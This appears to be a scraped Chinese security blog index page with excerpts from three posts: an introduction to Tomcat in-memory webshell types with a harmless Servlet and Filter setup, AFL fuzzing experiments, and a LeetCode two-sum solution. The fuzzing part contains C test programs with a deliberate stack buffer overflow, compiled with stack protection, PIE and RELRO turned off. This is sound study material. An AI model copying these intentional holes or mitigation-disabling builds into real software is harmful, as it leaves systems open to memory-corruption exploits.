<p>由于<code>Tomcat</code>的机制问题，存在很多可以写内存马的地方，依据[wjlshare师傅博客](<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1529" >Tomcat 内存马学习(一)：Filter型 – 天下大木头 (wjlshare.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>)介绍主要有如下几种</p>
<ul>
<li><p>servlet-api类</p>
</li>
<li><ul>
<li>filter型</li>
</ul>
</li>
<li><ul>
<li>servlet型</li>
</ul>
</li>
<li><p>spring类</p>
</li>
<li><ul>
<li>拦截器</li>
</ul>
</li>
<li><ul>
<li>controller型</li>
</ul>
</li>
<li><p>Java Instrumentation类</p>
</li>
<li><ul>
<li>agent型</li>
</ul>
</li>
</ul>

        <h3 id="servlet-api类"   >
          <a href="#servlet-api类" class="heading-link"><i class="fas fa-link"></i></a><a href="#servlet-api类" class="headerlink" title="servlet-api类"></a>servlet-api类</h3>
      <p>先需要探讨一下该机制，大概流程如下</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://paper.seebug.org/1441/#1jsp-webshell" >中间件内存马注入&amp;冰蝎连接 (seebug.org)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122181418299.png" alt="image-20221122181418299"></p>
<p>然后简单构建一下环境</p>
<ul>
<li>创建项目</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122174929458.png" alt="image-20221122174929458"></p>
<ul>
<li><p>添加一下<code>Web</code>框架</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175006785.png" alt="image-20221122175006785"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175139870.png"></p>
</li>
<li><p>导入对应<code>Tomcat</code>的<code>servlet-api</code>依赖</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175223681.png" alt="image-20221122175223681"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175306009.png" alt="image-20221122175306009"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175623013.png" alt="image-20221122175623013"></p>
</li>
<li><p>然后就可以创建<code>Servlet-Filter</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175715777.png" alt="image-20221122175715777"></p>
</li>
<li><p>创建之后需要在<code>web/WEB-INF/web.xml</code>中加入创建的<code>filter</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175937704.png" alt="image-20221122175937704"></p>
<p>这里设置了<code>url-pattern</code>为<code>/*</code>，表示所有的<code>url</code>都会经过该<code>filter</code></p>
</li>
<li><p>然后配置一下<code>Tomcat</code>服务器即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180133583.png" alt="image-20221122180133583"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180208208.png" alt="image-20221122180208208"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180232020.png" alt="image-20221122180232020"></p>
</li>
<li><p>相关代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180706555.png" alt="image-20221122180706555"></p>
<ul>
<li><p><code>Servlet</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;Servlet&quot;, value = &quot;/Servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Servlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;MyServlet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>MyFilter</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;MyFilter&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;MyFilter&quot;</span>);</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p>运行起来即可看到</p>
<p>任意存在的<code>URL</code>访问都会执行设置的<code>MyFilter</code>，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180751396.png" alt="image-20221122180751396"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180802377.png" alt="image-20221122180802377"></p>
</li>
</ul>
<p>当然一般是给对应的<code>Servlet</code>来对应的<code>filter</code>，修改一下<code>web.xml</code>里的<code>url-pattern</code>即可</p>

        <h4 id="①机制流程"   >
          <a href="#①机制流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#①机制流程" class="headerlink" title="①机制流程"></a>①机制流程</h4>
      
        <h1 id="TIPS"   >
          <a href="#TIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1>
      <ul>
<li><p>在<code>IDEA</code>中按两下<code>shift</code>键可以快速搜索项目中的类</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122110956487.png" alt="image-20221122110956487"></p>
</li>
</ul>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/09/30/AFL/">AFL</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-09-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-10-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、简单测试"   >
          <a href="#一、简单测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、简单测试" class="headerlink" title="一、简单测试"></a>一、简单测试</h1>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">0x1234</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You get it!\n&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,buf,<span class="number">0x60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="1-基础尝试"   >
          <a href="#1-基础尝试" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-基础尝试" class="headerlink" title="1.基础尝试"></a>1.基础尝试</h2>
      
        <h3 id="1-白盒"   >
          <a href="#1-白盒" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-白盒" class="headerlink" title="(1)白盒"></a>(1)白盒</h3>
      
        <h4 id="①基础"   >
          <a href="#①基础" class="heading-link"><i class="fas fa-link"></i></a><a href="#①基础" class="headerlink" title="①基础"></a>①基础</h4>
      <p>首先使用简单的<code>afl-clang-fast</code>来编译</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-clang-fast ./test.c -z execstack -fno-stack-protector -no-pie -z norelro -o afl_test</span><br></pre></td></tr></table></div></figure>

<p>然后跑起来，速度大约是<code>11.6k</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930135610901.png" alt="image-20220930135610901"></p>
<p>大概跑了6分钟，出现了第一个crash，查看一下，是大小为0x76</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930140345079.png" alt="image-20220930140345079"></p>
<p>然后蒸馏一下<code>afl-tmin -i inputSeed -o outSeed programer</code> </p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930141806144.png" alt="image-20220930141806144"></p>
<p>大小变为了<code>0x2d</code>，减去开始的4个字节，为<code>0x29</code>，再看看IDA反汇编出来的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930142125276.png" alt="image-20220930142125276"></p>
<p>可以看到确实距离<code>rbp</code>为<code>0x28</code>，多溢出一个字节就可以覆盖到<code>rbp</code>了。</p>
<p>此外设置的标志<code>int v4</code>也在<code>buf</code>上面，而非正常编译的先声明的更靠近栈底。</p>
<p>另外实际<code>gdb</code>调试的，其<code>main</code>函数栈不再是通过<code>leave ret</code>来返回了，而是直接<code>add rsp 0x38</code>，而<code>rbp</code>为0</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930142617012.png" alt="image-20220930142617012"></p>
<p><code>main</code>函数实际的返回地址距离<code>buf</code>为<code>0x28</code>倒是也能说的过去，就是不知道为什么要这么做。</p>

        <h4 id="②尝试-AFL-INIT"   >
          <a href="#②尝试-AFL-INIT" class="heading-link"><i class="fas fa-link"></i></a><a href="#②尝试-AFL-INIT" class="headerlink" title="②尝试__AFL_INIT()"></a>②尝试__AFL_INIT()</h4>
      <p>在源码中加入<code>__AFL_INIT()</code>，参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213431" >sakuraのAFL源码全注释（二）-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254167#h2-3" >AFL-Training学习记录-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><code>sakura师傅</code>介绍说，目的是为了在某些情况下可以减少操作系统、链接与libc内部执行程序的成本</p>
<p><code>iskindar师傅</code>介绍说，这是采用<code>Deferred initialization</code>的方式来提高AFL的性能，大概提高1.5x，最合适的地方是放在<code>read</code>函数前。也就是下面这几行代码。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">  __AFL_INIT();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>放入进去</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">    __AFL_INIT();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    read(<span class="number">0</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">0x1234</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You get it!\n&quot;</span>);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">        __AFL_INIT();</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        read(<span class="number">0</span>,buf,<span class="number">0x60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>之后正常编译</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-clang-fast ./test.c -z execstack -fno-stack-protector -no-pie -z norelro -o afl_test</span><br></pre></td></tr></table></div></figure>

<p>也相差无几，可能是程序太小，相关的<code>libc</code>库调用太少吧</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930143810066.png" alt="image-20220930143810066"></p>
<p>发现crash之后蒸馏得到的和不加<code>__AFL_INIT()</code>是一样的。</p>

        <h4 id="③尝试-AFL-LOOP-1000"   >
          <a href="#③尝试-AFL-LOOP-1000" class="heading-link"><i class="fas fa-link"></i></a><a href="#③尝试-AFL-LOOP-1000" class="headerlink" title="③尝试__AFL_LOOP(1000)"></a>③尝试__AFL_LOOP(1000)</h4>
      <p><code>persistent</code>模式，常常用来<code>fuzz</code>某些无状态的<code>API</code></p>
<p><code>iskindar师傅</code>介绍说，对于一些无状态的<code>API</code>库，可以复用进程来测试多个测试样例，从而减少fork系统调用的使用，进而减少OS的开销。</p>
<ul>
<li>状态：指的是交互过程中保存的会话信息，比如<code>cookie、session</code>等</li>
</ul>
<p>那么无状态的<code>API</code>指的就是在这个<code>API</code>里没有保存状态了。</p>
<p>先不使用<code>__AFL_LOOP</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;noStateAPI.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x60</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">   __AFL_INIT();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    read(<span class="number">0</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line">    <span class="comment">//read(0,buf,0x60);</span></span><br><span class="line">    vul(&amp;a,buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>库如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;noStateAPI.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">(<span class="keyword">int</span>* flag,<span class="keyword">char</span>* data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">if</span>(*flag == <span class="number">0x1234</span>)&#123;</span><br><span class="line">        <span class="comment">//strcpy(buf,data);</span></span><br><span class="line">        read(<span class="number">0</span>,buf,<span class="number">0x60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>编译加<code>FUZZ</code></p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">afl-clang-fast ./testNoLoopAPI.c ./noStateAPI.c -z execstack -fno-stack-protector -no-pie -z norelro -o afl_API_noLoop_test</span><br><span class="line">afl-fuzz -i otherIn -o afl_API_noLoop_out ./afl_API_noLoop_test</span><br></pre></td></tr></table></div></figure>

<p>开始运行之后会有<code>(odd, check syntax!)</code>，但是运行一段时间后就没有了，不太知道为啥</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930194310537.png" alt="image-20220930194310537"></p>
<p>最后大概五六分钟也能得到<code>crash</code></p>
<p>加入<code>__AFL_LOOP</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;noStateAPI.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x60</span>];</span><br><span class="line">    </span><br><span class="line">    read(<span class="number">0</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">    <span class="keyword">while</span> (__AFL_LOOP(<span class="number">1000</span>)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        vul(&amp;a,buf);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">    &#125;   </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后编译<code>FUZZ</code></p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">afl-clang-fast ./testAPI.c ./noStateAPI.c -z execstack -fno-stack-protector -no-pie -z norelro -o afl_API_test</span><br><span class="line">afl-fuzz -i otherIn -o afl_API_out ./afl_API_test</span><br></pre></td></tr></table></div></figure>

<p>但是这个跑一个小时都没出结果，很奇怪，不知道为什么，难道说有<code>read</code>或者有比对值的代码</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(*flag == <span class="number">0x1234</span>)&#123;</span><br><span class="line">    <span class="comment">//strcpy(buf,data);</span></span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>就代表是有状态的<code>API</code>吗</p>

        <h3 id="2-黑盒"   >
          <a href="#2-黑盒" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-黑盒" class="headerlink" title="(2)黑盒"></a>(2)黑盒</h3>
      <p>此外使用正常的<code>gcc</code>编译后，采用黑盒测试时</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -Q -i in -o hei_out ./test</span><br></pre></td></tr></table></div></figure>

<p>速度下降一大截</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930142948733.png" alt="image-20220930142948733"></p>
<p>不过还是能够发现<code>crash</code>，大概跑了十五六分钟。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930144540473.png" alt="image-20220930144540473"></p>
<p>可以看到大小是<code>0x4f</code>，减去标志的4个字节即为<code>0x4b</code>，与期待的大概<code>0x39</code>字节还是相差一点</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930144649388.png" alt="image-20220930144649388"></p>
<p>此外黑盒好像没办法蒸馏</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930144817799.png" alt="image-20220930144817799"></p>

        <h1 id="二、变异策略"   >
          <a href="#二、变异策略" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、变异策略" class="headerlink" title="二、变异策略"></a>二、变异策略</h1>
      <p>详见：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://rk700.github.io/2018/01/04/afl-mutations/" >AFL文件变异一览 - 记事本 (rk700.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/09/20/Leecode%E5%88%B7%E9%A2%98/">算法笔记</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-09-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-11-27</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="LeetCode题目"   >
          <a href="#LeetCode题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#LeetCode题目" class="headerlink" title="LeetCode题目"></a>LeetCode题目</h1>
      
        <h2 id="两数之和"   >
          <a href="#两数之和" class="heading-link"><i class="fas fa-link"></i></a><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h2>
      <p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p>
<p>你可以按任意顺序返回答案。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220911122050526.png" alt="image-20220911122050526"></p>
<p>遍历<code>nums</code>中的元素<code>num</code>，<code>num</code>索引为i，判定<code>target-num</code>这个元素是否在<code>nums[i+1,len(nums)]</code>，在则成功</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            flag = target - nums[i]</span><br><span class="line">            <span class="keyword">if</span>(flag <span class="keyword">in</span> nums[i+<span class="number">1</span>:<span class="built_in">len</span>(nums)]):</span><br><span class="line">                result.append(i)</span><br><span class="line">                result.append(nums.index(flag,i+<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></div></figure>

<p>C语言</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">twoSum</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> target,<span class="keyword">int</span>* returnSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>* returnArray = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; numsSize ; i++)&#123;</span><br><span class="line">        flag = target - nums[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i+<span class="number">1</span> ; j &lt; numsSize ; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(flag == nums[j])&#123;</span><br><span class="line">                returnArray[<span class="number">0</span>] = i;</span><br><span class="line">                returnArray[<span class="number">1</span>] = j;</span><br><span class="line">                *returnSize=<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">return</span> returnArray;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> returnArray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="回文数"   >
